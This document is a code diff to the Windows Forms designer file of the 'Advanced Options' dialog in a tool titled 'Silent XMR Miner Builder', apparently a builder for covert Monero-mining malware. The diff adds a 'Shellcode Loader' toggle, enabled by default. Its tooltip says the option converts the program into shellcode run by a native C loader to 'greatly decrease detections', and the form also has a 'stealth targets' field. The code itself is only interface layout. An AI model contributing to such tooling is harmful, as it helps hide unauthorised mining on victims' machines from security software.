@@ -25,6 +25,8 @@ Partial Class Advanced
         Me.components = New System.ComponentModel.Container()
         Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Advanced))
         Me.TooltipHelper = New System.Windows.Forms.ToolTip(Me.components)
+        Me.Label15 = New System.Windows.Forms.Label()
+        Me.Label13 = New System.Windows.Forms.Label()
         Me.Label7 = New System.Windows.Forms.Label()
         Me.Label11 = New System.Windows.Forms.Label()
         Me.Label9 = New System.Windows.Forms.Label()
@@ -33,8 +35,9 @@ Partial Class Advanced
         Me.Label1 = New System.Windows.Forms.Label()
         Me.Label3 = New System.Windows.Forms.Label()
         Me.Label6 = New System.Windows.Forms.Label()
-        Me.Label13 = New System.Windows.Forms.Label()
         Me.MephTheme1 = New SilentXMRMiner.MephTheme()
+        Me.Label16 = New System.Windows.Forms.Label()
+        Me.toggleShellcode = New SilentXMRMiner.MephToggleSwitch()
         Me.txtStealthTargets = New SilentXMRMiner.MephTextBox()
         Me.Label14 = New System.Windows.Forms.Label()
         Me.PictureBox2 = New System.Windows.Forms.PictureBox()
@@ -70,6 +73,35 @@ Partial Class Advanced
         Me.TooltipHelper.InitialDelay = 100
         Me.TooltipHelper.IsBalloon = True
         Me.TooltipHelper.ReshowDelay = 100
+        '
+        'Label15
+        '
+        Me.Label15.AutoSize = True
+        Me.Label15.BackColor = System.Drawing.Color.Transparent
+        Me.Label15.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label15.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label15.ForeColor = System.Drawing.Color.Teal
+        Me.Label15.Location = New System.Drawing.Point(120, 228)
+        Me.Label15.Name = "Label15"
+        Me.Label15.Size = New System.Drawing.Size(13, 13)
+        Me.Label15.TabIndex = 97
+        Me.Label15.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label15, "Will convert the program into shellcode and use a native C program to load it. Wi" &
+        "ll greatly decrease detections.")
+        '
+        'Label13
+        '
+        Me.Label13.AutoSize = True
+        Me.Label13.BackColor = System.Drawing.Color.Transparent
+        Me.Label13.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label13.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label13.ForeColor = System.Drawing.Color.Teal
+        Me.Label13.Location = New System.Drawing.Point(381, 76)
+        Me.Label13.Name = "Label13"
+        Me.Label13.Size = New System.Drawing.Size(13, 13)
+        Me.Label13.TabIndex = 93
+        Me.Label13.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label13, resources.GetString("Label13.ToolTip"))
         '
         'Label7
         '
@@ -190,25 +222,14 @@ Partial Class Advanced
         Me.Label6.Text = "?"
         Me.TooltipHelper.SetToolTip(Me.Label6, resources.GetString("Label6.ToolTip"))
         '
-        'Label13
-        '
-        Me.Label13.AutoSize = True
-        Me.Label13.BackColor = System.Drawing.Color.Transparent
-        Me.Label13.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label13.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label13.ForeColor = System.Drawing.Color.Teal
-        Me.Label13.Location = New System.Drawing.Point(381, 76)
-        Me.Label13.Name = "Label13"
-        Me.Label13.Size = New System.Drawing.Size(13, 13)
-        Me.Label13.TabIndex = 93
-        Me.Label13.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label13, resources.GetString("Label13.ToolTip"))
-        '
         'MephTheme1
         '
         Me.MephTheme1.AccentColor = System.Drawing.Color.DarkRed
         Me.MephTheme1.Anchor = System.Windows.Forms.AnchorStyles.None
         Me.MephTheme1.BackColor = System.Drawing.Color.FromArgb(CType(CType(28, Byte), Integer), CType(CType(28, Byte), Integer), CType(CType(28, Byte), Integer))
+        Me.MephTheme1.Controls.Add(Me.Label15)
+        Me.MephTheme1.Controls.Add(Me.Label16)
+        Me.MephTheme1.Controls.Add(Me.toggleShellcode)
         Me.MephTheme1.Controls.Add(Me.txtStealthTargets)
         Me.MephTheme1.Controls.Add(Me.Label13)
         Me.MephTheme1.Controls.Add(Me.Label14)
@@ -247,6 +268,31 @@ Partial Class Advanced
         Me.MephTheme1.SubHeader = "Advanced Options"
         Me.MephTheme1.TabIndex = 0
         Me.MephTheme1.Text = "Silent XMR Miner Builder"
+        '
+        'Label16
+        '
+        Me.Label16.AutoSize = True
+        Me.Label16.BackColor = System.Drawing.Color.Transparent
+        Me.Label16.Font = New System.Drawing.Font("Segoe UI", 9.5!)
+        Me.Label16.ForeColor = System.Drawing.Color.Gray
+        Me.Label16.Location = New System.Drawing.Point(10, 225)
+        Me.Label16.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
+        Me.Label16.Name = "Label16"
+        Me.Label16.Size = New System.Drawing.Size(112, 17)
+        Me.Label16.TabIndex = 96
+        Me.Label16.Text = "Shellcode Loader:"
+        '
+        'toggleShellcode
+        '
+        Me.toggleShellcode.BackColor = System.Drawing.Color.Transparent
+        Me.toggleShellcode.Checked = True
+        Me.toggleShellcode.ForeColor = System.Drawing.Color.Black
+        Me.toggleShellcode.Location = New System.Drawing.Point(189, 223)
+        Me.toggleShellcode.Margin = New System.Windows.Forms.Padding(2)
+        Me.toggleShellcode.Name = "toggleShellcode"
+        Me.toggleShellcode.Size = New System.Drawing.Size(50, 24)
+        Me.toggleShellcode.TabIndex = 95
+        Me.toggleShellcode.Text = "Enable Nicehash Mining"
         '
         'txtStealthTargets
         '
@@ -590,4 +636,7 @@ Partial Class Advanced
     Friend WithEvents txtStealthTargets As MephTextBox
     Friend WithEvents Label13 As Label
     Friend WithEvents Label14 As Label
+    Friend WithEvents Label15 As Label
+    Friend WithEvents Label16 As Label
+    Friend WithEvents toggleShellcode As MephToggleSwitch
 End Class
